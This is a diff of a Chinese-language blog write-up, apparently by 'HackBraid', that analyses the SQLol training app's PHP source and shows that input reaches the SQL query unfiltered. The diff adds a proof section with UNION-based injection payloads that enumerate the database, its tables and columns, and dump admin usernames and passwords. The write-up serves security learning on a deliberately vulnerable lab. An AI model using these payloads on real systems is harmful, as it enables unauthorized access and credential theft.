@@ -215,7 +215,7 @@
 
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">'submit'</span>])){ <span class="comment">//submit后，开始进入处理程序</span>
 
-<span class="keyword">switch</span>(<span class="variable">$_REQUEST</span>[<span class="string">'sanitize_quotes'</span>]){ <span class="comment">//单引号的处理</span>
+<span class="keyword">switch</span>(<span class="variable">$_REQUEST</span>[<span class="string">'sanitize_quotes'</span>]){ <span class="comment">//单引号的处理，表单选择不过滤，就是对应none，下面也就没有那个case</span>
 
     <span class="keyword">case</span> <span class="string">'quotes_double'</span>:
         <span class="variable">$_REQUEST</span>[<span class="string">'inject_string'</span>] = str_replace(<span class="string">'\''</span>, <span class="string">'\'\''</span>, <span class="variable">$_REQUEST</span>[<span class="string">'inject_string'</span>]);
@@ -229,7 +229,7 @@
 
 }
 
-<span class="comment">//对空格的处理</span>
+<span class="comment">//对空格的处理，如果参数中没有spaces_remove或者spaces_remove！=on就不会过滤空格</span>
 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">'spaces_remove'</span>]) <span class="keyword">and</span> <span class="variable">$_REQUEST</span>[<span class="string">'spaces_remove'</span>] == <span class="string">'on'</span>) <span class="variable">$_REQUEST</span>[<span class="string">'inject_string'</span>] = str_replace(<span class="string">' '</span>, <span class="string">''</span>, <span class="variable">$_REQUEST</span>[<span class="string">'inject_string'</span>]);
 
 <span class="comment">//黑名单关键字的处理，文章用不上，略过...</span>
@@ -268,7 +268,7 @@
 }
 
 <span class="preprocessor">?&gt;</span></span>
-</code></pre><p>3.我们再返回到select.php，发现后面也有个submit后表单处理程序，主要是判断要注射的位置并构造sql语句，跟进看下：</p>
+</code></pre><p>3.我们再返回到select.php，发现后面也有个submit后表单处理程序，判断要注射的位置并构造sql语句，跟进看下：</p>
 <pre><code>&lt;?php
 <span class="keyword">if</span>(isset($_REQUEST[<span class="string">'submit'</span>])){ //submit后，进入处理程序之二，<span class="number">1</span>在上面
 
@@ -331,7 +331,16 @@ include('</span>includes/database.inc.php<span class="string">');//这里又引�
 
 }
 ?&gt;</span>
-</code></pre><h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>这里写POC证明<br>本文由HackBraid整理总结，如需转载请联系作者。</p>
+</code></pre><p>4.跟进database.inc.php，终于带入查询了，所以表单看懂了，整个过程就没过滤^ ^</p>
+<pre><code><span class="variable">$db</span>_conn = NewADOConnection(<span class="variable">$dsn</span>);
+
+print(<span class="string">"\n&lt;br&gt;\n&lt;br&gt;"</span>);
+<span class="keyword">if</span>(isset($_REQUEST[<span class="string">'show_query'</span>]) and $_REQUEST[<span class="string">'show_query'</span>]==<span class="string">'on'</span>) echo <span class="string">"Query (injection string is &lt;u&gt;underlined&lt;/u&gt;): "</span> . <span class="variable">$displayquery</span> . <span class="string">"\n&lt;br&gt;"</span>;
+
+<span class="variable">$db</span>_conn-&gt;SetFetchMode(ADODB_FETCH_ASSOC);
+<span class="variable">$results</span> = <span class="variable">$db</span>_conn-&gt;Execute(<span class="variable">$query</span>);
+</code></pre><h2 id="0x04_漏洞证明">0x04 漏洞证明</h2><p>1.有了注入点了，我们先随意输入1然后选择注射位置为Where子句里的数字，开启Seay的MySql日志监控：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol3.png" alt=""><br>2.SQL查询语句为：SELECT username FROM users WHERE isadmin = 1 GROUP BY username ORDER BY username ASC<br>根据MySql日志监控里获取的sql语句判断可输出的只有一个字段，然后我们构造POC为：-1 union select 222333#，找到输出点“222333”的位置如下图：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol4.png" alt=""><br>3.构造获取数据库相关信息的POC:-1 union select concat(database(),0x5c,user(),0x5c,version())#，成功获取数据库名（sqlol）、账户名（root@localhost）和数据库版本(5.6.12)如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol5.png" alt=""><br>4.构造获取数据库sqlol中所有表信息的POC：-1 union select GROUP_CONCAT(DISTINCT table_name) from information_schema.tables where table_schema=0x73716C6F6C#，成功获取数据库sqlol所有表信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol6.png" alt=""><br>5.构造获取admin表所有字段信息的POC：-1 union select GROUP_CONCAT(DISTINCT column_name) from information_schema.columns where table_name=0x61646D696E#，成功获取表admin所有字段信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol7.png" alt=""><br>6.构造获取admin表账户密码的POC：-1 union select GROUP_CONCAT(DISTINCT username,0x5f,password) from admin#，成功获取管理员的账户密码信息如下：<br><img src="http://7xk8bu.com1.z0.glb.clouddn.com/sqlol8.png" alt=""></p>
+<p>本文由HackBraid整理总结，如需转载请联系作者。</p>
 
       
     </div>
